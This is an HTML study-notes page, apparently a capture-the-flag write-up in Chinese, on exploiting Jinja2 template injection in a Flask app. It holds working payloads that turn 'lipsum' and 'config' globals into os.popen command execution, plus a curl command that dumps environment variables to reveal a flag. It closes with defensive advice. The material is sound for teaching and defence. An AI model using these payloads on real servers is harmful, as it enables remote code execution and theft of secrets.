@@ -1,0 +1,1031 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSTI 模板注入 · 学霸笔记</title>
+    <link href="https://fonts.googleapis.com/css2?family=Kalam:wght@300;400;700&family=Ma+Shan+Zheng&family=Zeyada&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
+    <style>
+        :root {
+            --paper-color: #fdfbf7;
+            --paper-shadow: #e8e4dc;
+            --ink-color: #2c2c2c;
+            --ink-light: #4a4a4a;
+            --accent-blue: #2b6cb0;
+            --accent-red: #c53030;
+            --highlight: rgba(255, 255, 0, 0.4);
+            --highlight-pink: rgba(255, 105, 180, 0.3);
+            --line-color: #a4b0be;
+            --margin-line: #ff6b6b;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Kalam', 'Ma Shan Zheng', cursive;
+            background: #3d3d3d;
+            background-image:
+                radial-gradient(circle at 20% 50%, rgba(255,255,255,0.05) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(255,255,255,0.03) 0%, transparent 50%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        .notebook {
+            width: 900px;
+            max-width: 95vw;
+            background: #8b4513;
+            background-image:
+                repeating-linear-gradient(90deg, transparent, transparent 2px, rgba(0,0,0,0.1) 2px, rgba(0,0,0,0.1) 4px),
+                linear-gradient(180deg, #8b4513 0%, #6b3410 100%);
+            border-radius: 12px 18px 18px 12px;
+            padding: 25px 20px 25px 35px;
+            box-shadow:
+                0 0 0 2px #5c2e0b,
+                0 20px 60px rgba(0,0,0,0.6),
+                inset 0 1px 0 rgba(255,255,255,0.1);
+            position: relative;
+            transform-style: preserve-3d;
+            perspective: 1500px;
+        }
+
+        .notebook::before {
+            content: '';
+            position: absolute;
+            left: 25px;
+            top: 15px;
+            bottom: 15px;
+            width: 3px;
+            background: linear-gradient(180deg,
+                rgba(0,0,0,0.3) 0%, rgba(0,0,0,0.1) 20%,
+                rgba(0,0,0,0.3) 40%, rgba(0,0,0,0.1) 60%,
+                rgba(0,0,0,0.3) 80%, rgba(0,0,0,0.1) 100%);
+            border-radius: 2px;
+        }
+
+        .rings {
+            position: absolute;
+            left: 8px;
+            top: 0;
+            bottom: 0;
+            width: 30px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-evenly;
+            z-index: 10;
+        }
+
+        .ring {
+            width: 24px;
+            height: 14px;
+            background: linear-gradient(180deg, #c0c0c0 0%, #808080 50%, #a0a0a0 100%);
+            border-radius: 50%;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.3);
+            position: relative;
+        }
+
+        .ring::after {
+            content: '';
+            position: absolute;
+            left: 50%;
+            top: -3px;
+            width: 8px;
+            height: 20px;
+            background: linear-gradient(90deg, #d0d0d0 0%, #909090 50%, #b0b0b0 100%);
+            border-radius: 4px;
+            transform: translateX(-50%);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
+        }
+
+        .pages-container {
+            position: relative;
+            width: 100%;
+            min-height: 700px;
+        }
+
+        .page {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            min-height: 700px;
+            background: var(--paper-color);
+            background-image:
+                repeating-linear-gradient(transparent, transparent 31px, var(--line-color) 31px, var(--line-color) 32px);
+            background-size: 100% 32px;
+            background-position: 0 48px;
+            border-radius: 4px 12px 12px 4px;
+            padding: 40px 50px 40px 60px;
+            box-shadow: 2px 2px 8px rgba(0,0,0,0.15), inset 0 0 60px rgba(139, 69, 19, 0.03);
+            transform-origin: left center;
+            transition: transform 0.8s cubic-bezier(0.645, 0.045, 0.355, 1), opacity 0.6s ease;
+            opacity: 0;
+            pointer-events: none;
+            overflow: hidden;
+        }
+
+        .page.active { opacity: 1; pointer-events: all; transform: rotateY(0deg); z-index: 5; }
+        .page.flipped { transform: rotateY(-140deg); opacity: 0; pointer-events: none; }
+
+        .page::before {
+            content: '';
+            position: absolute;
+            left: 50px;
+            top: 0;
+            bottom: 0;
+            width: 1px;
+            background: var(--margin-line);
+            opacity: 0.4;
+        }
+
+        .page::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.03'/%3E%3C/svg%3E");
+            pointer-events: none;
+            opacity: 0.6;
+        }
+
+        .page.cover {
+            background: #f5f0e8;
+            background-image: none;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            cursor: pointer;
+        }
+        .page.cover::before { display: none; }
+
+        .cover-decoration {
+            position: absolute;
+            top: 30px;
+            right: 40px;
+            font-size: 4rem;
+            opacity: 0.15;
+            transform: rotate(-15deg);
+        }
+
+        .cover-title {
+            font-family: 'Ma Shan Zheng', cursive;
+            font-size: 3.5rem;
+            color: var(--accent-red);
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+            position: relative;
+            display: inline-block;
+        }
+        .cover-title::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: -10%;
+            width: 120%;
+            height: 3px;
+            background: var(--accent-red);
+            opacity: 0.3;
+            border-radius: 2px;
+        }
+
+        .cover-subtitle {
+            font-size: 1.4rem;
+            color: var(--ink-light);
+            margin-bottom: 40px;
+            font-style: italic;
+        }
+
+        .cover-doodle {
+            width: 200px;
+            height: 150px;
+            margin: 20px 0;
+            opacity: 0.6;
+        }
+
+        .cover-hint {
+            position: absolute;
+            bottom: 40px;
+            font-size: 1rem;
+            color: var(--ink-light);
+            opacity: 0.7;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+
+        .content-wrapper { position: relative; z-index: 1; }
+
+        .page-header {
+            font-family: 'Ma Shan Zheng', cursive;
+            font-size: 2rem;
+            color: var(--accent-red);
+            margin-bottom: 16px;
+            padding-bottom: 6px;
+            border-bottom: 2px solid var(--accent-red);
+            opacity: 0.7;
+            display: inline-block;
+        }
+
+        .handwriting {
+            font-size: 1.15rem;
+            line-height: 32px;
+            color: var(--ink-color);
+            text-align: justify;
+            margin-bottom: 12px;
+            position: relative;
+        }
+
+        .highlight {
+            background: linear-gradient(180deg, transparent 60%, var(--highlight) 60%);
+            padding: 0 2px;
+            font-weight: bold;
+        }
+
+        .highlight-pink {
+            background: linear-gradient(180deg, transparent 60%, var(--highlight-pink) 60%);
+            padding: 0 2px;
+            font-weight: bold;
+        }
+
+        .underline-wavy {
+            text-decoration: underline;
+            text-decoration-style: wavy;
+            text-decoration-color: var(--accent-red);
+            text-underline-offset: 3px;
+            font-weight: bold;
+        }
+
+        .key-term {
+            color: var(--accent-blue);
+            font-weight: bold;
+            border-bottom: 1px dashed var(--accent-blue);
+        }
+
+        .code-term {
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            background: rgba(43, 108, 176, 0.1);
+            color: var(--accent-blue);
+            padding: 0 4px;
+            border-radius: 3px;
+            border-bottom: 1px solid var(--accent-blue);
+        }
+
+        .warning-text {
+            color: var(--accent-red);
+            font-weight: bold;
+        }
+
+        .diagram-container {
+            background: rgba(255,255,255,0.6);
+            border: 2px dashed var(--line-color);
+            border-radius: 12px;
+            padding: 16px;
+            margin: 12px 0;
+            position: relative;
+        }
+
+        .diagram-title {
+            font-family: 'Ma Shan Zheng', cursive;
+            font-size: 1.2rem;
+            color: var(--accent-red);
+            margin-bottom: 12px;
+            text-align: center;
+        }
+
+        .page-number {
+            position: absolute;
+            bottom: 15px;
+            right: 30px;
+            font-size: 0.9rem;
+            color: var(--ink-light);
+            opacity: 0.6;
+        }
+
+        .doodle {
+            position: absolute;
+            opacity: 0.12;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .doodle-1 {
+            top: 80px;
+            right: 40px;
+            font-size: 3rem;
+            transform: rotate(20deg);
+        }
+
+        .key-point-box {
+            background: linear-gradient(135deg, #fff9e6 0%, #fff5d6 100%);
+            border: 2px solid var(--accent-red);
+            border-radius: 10px;
+            padding: 12px 16px;
+            margin: 12px 0;
+            position: relative;
+            box-shadow: 2px 2px 0 rgba(0,0,0,0.06);
+        }
+
+        .key-point-box::before {
+            content: '\2605';
+            position: absolute;
+            top: -10px;
+            left: 12px;
+            background: var(--paper-color);
+            padding: 0 6px;
+            color: var(--accent-red);
+            font-size: 1rem;
+        }
+
+        .key-point-box .box-title {
+            font-family: 'Ma Shan Zheng', cursive;
+            font-size: 1.1rem;
+            color: var(--accent-red);
+            margin-bottom: 6px;
+        }
+
+        .key-point-box .box-content {
+            font-size: 1rem;
+            line-height: 1.6;
+            color: var(--ink-color);
+        }
+
+        .concept-cards {
+            display: flex;
+            gap: 12px;
+            margin: 12px 0;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .concept-card {
+            background: #fff;
+            border: 2px solid var(--ink-light);
+            border-radius: 10px;
+            padding: 12px 16px;
+            text-align: center;
+            box-shadow: 2px 2px 0 rgba(0,0,0,0.08);
+            flex: 1;
+            min-width: 120px;
+            max-width: 200px;
+        }
+
+        .concept-card .card-icon {
+            font-size: 1.8rem;
+            margin-bottom: 6px;
+            color: var(--accent-red);
+        }
+
+        .concept-card .card-title {
+            font-family: 'Ma Shan Zheng', cursive;
+            font-size: 1.1rem;
+            color: var(--accent-red);
+            margin-bottom: 4px;
+        }
+
+        .concept-card .card-desc {
+            font-size: 0.85rem;
+            color: var(--ink-light);
+            line-height: 1.4;
+        }
+
+        .flow-steps {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin: 12px 0;
+            flex-wrap: wrap;
+        }
+
+        .flow-step {
+            background: #fff;
+            border: 2px solid var(--line-color);
+            border-radius: 8px;
+            padding: 8px 12px;
+            text-align: center;
+            font-size: 0.9rem;
+            box-shadow: 1px 1px 0 rgba(0,0,0,0.06);
+        }
+
+        .flow-step .step-num {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            background: var(--accent-red);
+            color: white;
+            border-radius: 50%;
+            font-size: 0.75rem;
+            line-height: 20px;
+            margin-right: 4px;
+        }
+
+        .flow-arrow {
+            font-size: 1.2rem;
+            color: var(--accent-red);
+        }
+
+        .sticky-note {
+            position: absolute;
+            background: #fffacd;
+            padding: 12px;
+            box-shadow: 2px 4px 8px rgba(0,0,0,0.15);
+            transform: rotate(-3deg);
+            font-size: 0.85rem;
+            max-width: 160px;
+            z-index: 10;
+        }
+
+        .sticky-note::before {
+            content: '';
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 40px;
+            height: 12px;
+            background: rgba(255,255,255,0.4);
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+
+        .sticky-note.top-right {
+            top: 20px;
+            right: 20px;
+            transform: rotate(3deg);
+        }
+
+        .bypass-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 12px 0;
+            font-size: 0.95rem;
+        }
+
+        .bypass-table th,
+        .bypass-table td {
+            border: 2px solid var(--line-color);
+            padding: 8px 12px;
+            text-align: left;
+        }
+
+        .bypass-table th {
+            background: #fff9e6;
+            color: var(--accent-red);
+            font-family: 'Ma Shan Zheng', cursive;
+            font-size: 1.05rem;
+        }
+
+        .bypass-table td {
+            background: #fff;
+        }
+
+        .bypass-table td code {
+            font-family: 'Courier New', monospace;
+            font-size: 0.85em;
+            background: rgba(43, 108, 176, 0.08);
+            color: var(--accent-blue);
+            padding: 0 3px;
+            border-radius: 3px;
+            word-break: break-all;
+        }
+
+        .bypass-table .bypass-yes {
+            color: var(--accent-red);
+            font-weight: bold;
+        }
+
+        .code-block {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            border-radius: 10px;
+            padding: 16px;
+            margin: 12px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            overflow-x: auto;
+            box-shadow: 3px 3px 0 rgba(0,0,0,0.15);
+            position: relative;
+        }
+
+        .code-block::before {
+            content: 'bash';
+            position: absolute;
+            top: 6px;
+            right: 12px;
+            font-size: 0.75rem;
+            color: #75715e;
+            font-family: 'Kalam', cursive;
+        }
+
+        .code-block.python::before { content: 'python'; }
+
+        .code-block .comment {
+            color: #75715e;
+        }
+
+        .code-block .cmd {
+            color: #66d9ef;
+        }
+
+        .code-block .arg {
+            color: #a6e22e;
+        }
+
+        .code-block .val {
+            color: #e6db74;
+        }
+
+        .attack-chain {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin: 16px 0;
+            flex-wrap: wrap;
+        }
+
+        .chain-node {
+            background: #fff;
+            border: 3px solid var(--accent-red);
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            font-size: 0.8rem;
+            box-shadow: 2px 2px 0 rgba(0,0,0,0.1);
+            position: relative;
+        }
+
+        .chain-node .node-icon {
+            font-size: 1.4rem;
+            color: var(--accent-red);
+            margin-bottom: 2px;
+        }
+
+        .chain-node .node-label {
+            font-family: 'Ma Shan Zheng', cursive;
+            font-size: 0.85rem;
+            color: var(--accent-red);
+        }
+
+        .chain-arrow {
+            font-size: 1.5rem;
+            color: var(--accent-red);
+        }
+
+        .chain-result {
+            background: linear-gradient(135deg, #fff5f5 0%, #fed7d7 100%);
+            border: 2px solid var(--accent-red);
+            border-radius: 10px;
+            padding: 10px 16px;
+            font-size: 1rem;
+            color: var(--accent-red);
+            font-weight: bold;
+            box-shadow: 2px 2px 0 rgba(0,0,0,0.1);
+        }
+
+        @media (max-width: 768px) {
+            .notebook { padding: 20px 15px 20px 30px; }
+            .page { padding: 30px 25px 30px 45px; min-height: 500px; }
+            .cover-title { font-size: 2.5rem; }
+            .handwriting { font-size: 1rem; line-height: 28px; }
+            .concept-cards { flex-direction: column; align-items: center; }
+            .concept-card { max-width: 100%; width: 100%; }
+            .attack-chain { flex-direction: column; }
+            .chain-arrow { transform: rotate(90deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="notebook">
+        <div class="rings">
+            <div class="ring"></div>
+            <div class="ring"></div>
+            <div class="ring"></div>
+            <div class="ring"></div>
+            <div class="ring"></div>
+            <div class="ring"></div>
+            <div class="ring"></div>
+            <div class="ring"></div>
+        </div>
+
+        <div class="pages-container" id="pagesContainer">
+            <!-- 封面 -->
+            <div class="page cover active" data-page="0">
+                <div class="cover-decoration"><i class="ri-code-s-slash-line"></i></div>
+                <div class="cover-title">SSTI 模板注入</div>
+                <div class="cover-subtitle">从表达式执行到 RCE · N1BOOK 第03章 WEB进阶</div>
+                <svg class="cover-doodle" viewBox="0 0 220 130">
+                    <path d="M15,55 Q35,55 35,70 Q35,85 15,85" fill="none" stroke="#c53030" stroke-width="2.5" stroke-linecap="round"/>
+                    <path d="M27,55 Q47,55 47,70 Q47,85 27,85" fill="none" stroke="#c53030" stroke-width="2.5" stroke-linecap="round"/>
+                    <text x="58" y="78" font-size="18" fill="#2c2c2c">→</text>
+                    <text x="80" y="82" font-size="20" fill="#2b6cb0" font-weight="bold">49</text>
+                    <path d="M115,50 h62 a8,8 0 0 1 8,8 v24 a8,8 0 0 1 -8,8 h-62 a8,8 0 0 1 -8,-8 v-24 a8,8 0 0 1 8,-8 z" fill="none" stroke="#2c2c2c" stroke-width="1.8"/>
+                    <text x="123" y="70" font-size="13" fill="#c53030">RCE</text>
+                    <text x="123" y="85" font-size="12" fill="#2c2c2c">os.popen</text>
+                    <path d="M60,100 L160,100" stroke="#c53030" stroke-width="1.5" stroke-dasharray="5,5" opacity="0.5"/>
+                </svg>
+                <div style="font-size: 1rem; color: var(--ink-light); margin-top: 20px;">
+                    <span style="display: block; margin: 5px 0;"><i class="ri-check-line"></i> 探测：{{7*7}} → 49 锁定 Jinja2</span>
+                    <span style="display: block; margin: 5px 0;"><i class="ri-check-line"></i> RCE 最短链：lipsum.__globals__["os"].popen()</span>
+                    <span style="display: block; margin: 5px 0;"><i class="ri-check-line"></i> Flag 藏在环境变量：env</span>
+                </div>
+                <div class="cover-hint">点击翻页开始阅读 ↓</div>
+            </div>
+
+            <!-- 第1页：概念速通 -->
+            <div class="page" data-page="1">
+                <div class="content-wrapper">
+                    <div class="page-header">一、概念速通</div>
+
+                    <div class="doodle doodle-1"><i class="ri-bug-line"></i></div>
+
+                    <p class="handwriting" id="text1"></p>
+
+                    <!-- 三要素卡片 -->
+                    <div class="concept-cards">
+                        <div class="concept-card">
+                            <div class="card-icon"><i class="ri-chat-3-line"></i></div>
+                            <div class="card-title">输入有回显</div>
+                            <div class="card-desc">用户输入被页面原样显示</div>
+                        </div>
+                        <div class="concept-card">
+                            <div class="card-icon"><i class="ri-file-code-line"></i></div>
+                            <div class="card-title">模板渲染</div>
+                            <div class="card-desc">服务端用模板引擎渲染页面</div>
+                        </div>
+                        <div class="concept-card">
+                            <div class="card-icon"><i class="ri-eye-off-line"></i></div>
+                            <div class="card-title">无过滤</div>
+                            <div class="card-desc">输入直接拼入模板字符串</div>
+                        </div>
+                    </div>
+
+                    <!-- 成因源码 -->
+                    <div class="diagram-container">
+                        <div class="diagram-title">漏洞成因源码（容器内 /app/server.py）</div>
+                        <div class="code-block python">
+<span class="comment">@app.route('/')</span>
+<span class="cmd">def</span> <span class="arg">index</span>():
+    password = request.args.get(<span class="val">"password"</span>) <span class="cmd">or</span> <span class="val">""</span>
+    template = <span class="val">'''
+%s</span> <span class="arg">%</span> (password)
+    <span class="cmd">return</span> render_template_string(template)
+                        </div>
+                    </div>
+
+                    <div class="key-point-box">
+                        <div class="box-title">高频辨析：两个 API 的安全性天差地别</div>
+                        <div class="box-content">
+                            <span class="code-term">render_template("x.html", ...)</span> 渲染<span class="highlight">文件模板</span>，输入作为数据传入，不参与解析 → <span class="highlight-green" style="color:#2f855a; font-weight:bold;">安全</span>；
+                            <span class="code-term">render_template_string(str)</span> 把<span class="highlight-pink">字符串当模板源码</span>渲染，用户输入混入即注入点 → <span class="warning-text">危险</span>！
+                        </div>
+                    </div>
+                </div>
+                <div class="page-number">1</div>
+            </div>
+
+            <!-- 第2页：模板引擎判定 -->
+            <div class="page" data-page="2">
+                <div class="content-wrapper">
+                    <div class="page-header">二、模板引擎判定（探测三步法）</div>
+
+                    <p class="handwriting" id="text2"></p>
+
+                    <div class="diagram-container">
+                        <div class="diagram-title">输入 7*7 表达式，观察是否被求值</div>
+                        <table class="bypass-table">
+                            <thead>
+                                <tr>
+                                    <th>测试输入</th>
+                                    <th>命中引擎</th>
+                                    <th>结果含义</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><code>{{7*7}}</code></td>
+                                    <td>Jinja2 / Twig / Nunjucks</td>
+                                    <td>输出 <span class="highlight">49</span> = SSTI 成立</td>
+                                </tr>
+                                <tr>
+                                    <td><code>${7*7}</code></td>
+                                    <td>JSP / FreeMarker</td>
+                                    <td>输出 49 = 成立</td>
+                                </tr>
+                                <tr>
+                                    <td><code>&lt;%= 7*7 %&gt;</code></td>
+                                    <td>ERB / ASP</td>
+                                    <td>输出 49 = 成立</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <div class="key-point-box">
+                        <div class="box-title">本题实测结果</div>
+                        <div class="box-content">
+                            <i class="ri-check-line" style="color:#2f855a;"></i> <span class="code-term">{{7*7}}</span> → <span class="highlight">49</span>　确认注入且是 Jinja2 语法<br>
+                            <i class="ri-close-circle-line" style="color:#c53030;"></i> <span class="code-term">${7*7}</span> 与 <span class="code-term">&lt;%= 7*7 %&gt;</span> 原样输出　→ 排除 JSP / FreeMarker / ERB / ASP
+                        </div>
+                    </div>
+                </div>
+                <div class="page-number">2</div>
+            </div>
+
+            <!-- 第3页：RCE 原理精讲 -->
+            <div class="page" data-page="3">
+                <div class="content-wrapper">
+                    <div class="page-header">三、RCE 原理精讲（核心链）</div>
+
+                    <p class="handwriting" id="text3"></p>
+
+                    <!-- 升级链可视化 -->
+                    <div class="attack-chain">
+                        <div class="chain-node">
+                            <div class="node-icon"><i class="ri-braces-line"></i></div>
+                            <div class="node-label">{{7*7}}<br>表达式执行</div>
+                        </div>
+                        <div class="chain-arrow">→</div>
+                        <div class="chain-node">
+                            <div class="node-icon"><i class="ri-function-line"></i></div>
+                            <div class="node-label">lipsum<br>内置函数</div>
+                        </div>
+                        <div class="chain-arrow">→</div>
+                        <div class="chain-node">
+                            <div class="node-icon"><i class="ri-database-2-line"></i></div>
+                            <div class="node-label">__globals__<br>全局字典</div>
+                        </div>
+                        <div class="chain-arrow">→</div>
+                        <div class="chain-node">
+                            <div class="node-icon"><i class="ri-terminal-box-line"></i></div>
+                            <div class="node-label">["os"]<br>取模块</div>
+                        </div>
+                        <div class="chain-arrow">→</div>
+                        <div class="chain-result">
+                            <i class="ri-skull-line"></i> os.popen RCE
+                        </div>
+                    </div>
+
+                    <!-- 候选函数卡片 -->
+                    <div class="concept-cards">
+                        <div class="concept-card">
+                            <div class="card-icon"><i class="ri-star-line"></i></div>
+                            <div class="card-title">lipsum</div>
+                            <div class="card-desc">jinja2/utils.py，顶部 import os，首选</div>
+                        </div>
+                        <div class="concept-card">
+                            <div class="card-icon"><i class="ri-star-line"></i></div>
+                            <div class="card-title">url_for</div>
+                            <div class="card-desc">flask/helpers.py，globals 里有 os</div>
+                        </div>
+                        <div class="concept-card">
+                            <div class="card-icon"><i class="ri-settings-3-line"></i></div>
+                            <div class="card-title">config</div>
+                            <div class="card-desc">非函数，走 config.__init__.__globals__</div>
+                        </div>
+                    </div>
+
+                    <div class="key-point-box">
+                        <div class="box-title">一句话背下整条链</div>
+                        <div class="box-content">
+                            Python 中<span class="underline-wavy">任何函数对象都有 <span class="code-term">__globals__</span></span>，它指向函数所在模块的全局命名空间字典 —— 模块 import 过 os，就能 <span class="code-term">函数.__globals__["os"].popen("id").read()</span> 执行命令并读回显。
+                        </div>
+                    </div>
+                </div>
+                <div class="page-number">3</div>
+            </div>
+
+            <!-- 第4页：必背 Payload -->
+            <div class="page" data-page="4">
+                <div class="content-wrapper">
+                    <div class="page-header">四、必背 Payload 速查表</div>
+
+                    <p class="handwriting" id="text4"></p>
+
+                    <div class="diagram-container">
+                        <div class="diagram-title">考前 5 分钟看这个</div>
+                        <table class="bypass-table">
+                            <thead>
+                                <tr>
+                                    <th>目的</th>
+                                    <th>Payload</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>探测 Jinja2</td>
+                                    <td><code>{{7*7}}</code></td>
+                                </tr>
+                                <tr>
+                                    <td>首选 RCE</td>
+                                    <td><code>{{lipsum.__globals__["os"].popen("id").read()}}</code></td>
+                                </tr>
+                                <tr>
+                                    <td>备选 RCE（无 lipsum）</td>
+                                    <td><code>{{config.__init__.__globals__["os"].popen("id").read()}}</code></td>
+                                </tr>
+                                <tr>
+                                    <td>读环境变量 / 列目录</td>
+                                    <td><code>...popen("env").read()</code> / <code>...popen("ls /").read()</code></td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <div class="code-block">
+<span class="comment"># 首选最短链</span>
+password=<span class="arg">{{lipsum.__globals__["os"].popen("id").read()}}</span>
+<span class="comment"># → uid=0(root) gid=0(root) ...</span>
+                    </div>
+
+                    <div class="key-point-box">
+                        <div class="box-title">通用链与引号细节</div>
+                        <div class="box-content">
+                            通用链：<span class="code-term">{{"".__class__.__mro__[1].__subclasses__()}}</span> 列出所有已加载类，找 <span class="key-term">subprocess.Popen</span> 下标 N，再 <span class="code-term">__subclasses__()[N]("id", shell=True, stdout=-1).communicate()</span>。<br>
+                            <span class="orange-text" style="font-weight:bold;">双引号优先</span>：<span class="code-term">["os"]</span> 用双引号，很多题过滤单引号（本题实测单双均可）。
+                        </div>
+                    </div>
+
+                    <div class="doodle doodle-1"><i class="ri-terminal-box-line"></i></div>
+                </div>
+                <div class="page-number">4</div>
+            </div>
+
+            <!-- 第5页：实战流程与 Flag -->
+            <div class="page" data-page="5">
+                <div class="content-wrapper">
+                    <div class="page-header">五、实战流程与 Flag 获取</div>
+
+                    <p class="handwriting" id="text5"></p>
+
+                    <div class="diagram-container">
+                        <div class="diagram-title">拿到类似题照抄</div>
+                        <div class="flow-steps">
+                            <div class="flow-step"><span class="step-num">1</span>访问目标找参数</div>
+                            <span class="flow-arrow">→</span>
+                            <div class="flow-step"><span class="step-num">2</span>确认请求方式</div>
+                            <span class="flow-arrow">→</span>
+                            <div class="flow-step"><span class="step-num">3</span>模板三连探测</div>
+                            <span class="flow-arrow">→</span>
+                            <div class="flow-step"><span class="step-num">4</span>lipsum 链打 RCE</div>
+                            <span class="flow-arrow">→</span>
+                            <div class="flow-step"><span class="step-num">5</span>env 拿 flag</div>
+                        </div>
+                    </div>
+
+                    <div class="code-block">
+<span class="cmd">curl -G</span> <span class="arg">"TARGET/?password=</span><span class="val">{{lipsum.__globals__["os"].popen("env").read()}}</span><span class="arg">"</span>
+<span class="comment"># → 环境变量列表，含 FLAG=CTF2{9f80767c-40c5-42ac-a29f-0ff382403341}</span>
+                    </div>
+
+                    <div class="key-point-box">
+                        <div class="box-title">本题 Flag 藏点</div>
+                        <div class="box-content">
+                            <span class="highlight">环境变量</span> <span class="code-term">FLAG=CTF2{9f80767c-40c5-42ac-a29f-0ff382403341}</span><br>
+                            源码注释另有原题 flag <span class="code-term">n1book{eddb84d69a421a82}</span>（作者留下的，以平台环境变量为准）。
+                            <span class="orange-text" style="font-weight:bold;">藏点优先级：环境变量 &gt; 根目录/flag 文件 &gt; 源码注释 &gt; 数据库 &gt; /proc</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="page-number">5</div>
+            </div>
+
+            <!-- 第6页：易错点与防御 -->
+            <div class="page" data-page="6">
+                <div class="content-wrapper">
+                    <div class="page-header">六、易错点与防御视角</div>
+
+                    <p class="handwriting" id="text6"></p>
+
+                    <div class="diagram-container">
+                        <div class="diagram-title">血泪教训（考场浪费时间实录）</div>
+                        <table class="bypass-table">
+                            <thead>
+                                <tr>
+                                    <th>坑</th>
+                                    <th>正确做法</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><i class="ri-close-circle-line" style="color:#c53030;"></i> <code>--data-urlencode '{{7*7}}'</code> 不带参数名，payload 变成参数名，全返回空，误判"被过滤"</td>
+                                    <td>必须写 <code>--data-urlencode 'password={{7*7}}'</code>，<span class="highlight">先确认参数名再发包</span></td>
+                                </tr>
+                                <tr>
+                                    <td><i class="ri-close-circle-line" style="color:#c53030;"></i> POST 提交 → 405 Method Not Allowed</td>
+                                    <td>看响应头 <code>Allow: HEAD, GET, OPTIONS</code>，换 GET 带参</td>
+                                </tr>
+                                <tr>
+                                    <td><i class="ri-close-circle-line" style="color:#c53030;"></i> 一步到位打 RCE 失败就以为漏洞不存在</td>
+                                    <td><span class="highlight">分步验证</span>：{{7*7}} → {{lipsum}} → __globals__ → popen，每步定位断点</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <div class="key-point-box" style="border-color: #2f855a; background: linear-gradient(135deg, #f0fff4 0%, #e6ffed 100%);">
+                        <div class="box-title" style="color: #2f855a;">防御视角（面试/复盘考点）</div>
+                        <div class="box-content">
+                            <i class="ri-check-line" style="color:#2f855a;"></i> 用 <span class="code-term">render_template</span>（文件模板）替代 <span class="code-term">render_template_string</span> 渲染用户输入<br>
+                            <i class="ri-check-line" style="color:#2f855a;"></i> 必须拼接时，对 <span class="code-term">{{ }}</span>、<span class="code-term">{% %}</span>、<span class="code-term">{# #}</span> 转义或白名单校验<br>
+                            <i class="ri-check-line" style="color:#2f855a;"></i> 模板引擎开启沙箱（Jinja2 sandboxed environment）
+                        </div>
+                    </div>
+                </div>
+                <div class="page-number">6</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentPage = 0;
+        const totalPages = 7;
+        const pages = document.querySelectorAll('.page');
+
+        const texts = {
+            1: `<span class="key-term">SSTI</span>（服务端模板注入）：用户输入未过滤，直接拼入模板源码，被模板引擎当作<span class="highlight">代码</span>渲染执行。
+
+三要素：输入有回显、服务端用模板引擎渲染、无过滤。危害等级 <span class="warning-text">可直接 RCE</span>！`,
+
+            2: `口诀：先<span class="highlight">花括号</span>（{{}}），再<span class="highlight">美元符</span>（\${}），后<span class="highlight">尖括号</span>（&lt;%= %&gt;）。
+
+输入 7*7 的表达式，观察是否被求值 —— 被求值 = 该模板引擎的语法命中。`,
+
+            3: `Python 中<span class="highlight">任何函数对象都有 <span class="code-term">__globals__</span></span> 属性，指向函数所在模块的<span class="highlight">全局命名空间字典</span>。模块 import 过 os，就能 <span class="code-term">函数.__globals__["os"]</span> 拿到 os 模块。
+
+<span class="key-term">lipsum</span> 是模板内置全局函数（生成 lorem ipsum），来自 <span class="code-term">jinja2/utils.py</span>，顶部必然 import os —— 最短链首选。`,
+
+            4: `最短链一行：<span class="code-term">{{lipsum.__globals__["os"].popen("id").read()}}</span>。
+
+字符串一律用<span class="highlight">双引号</span>，防单引号被过滤。`,
+
+            5: `按部就班：确认参数名 → 探测引擎 → 逐级升级到 RCE → 找 flag。
+
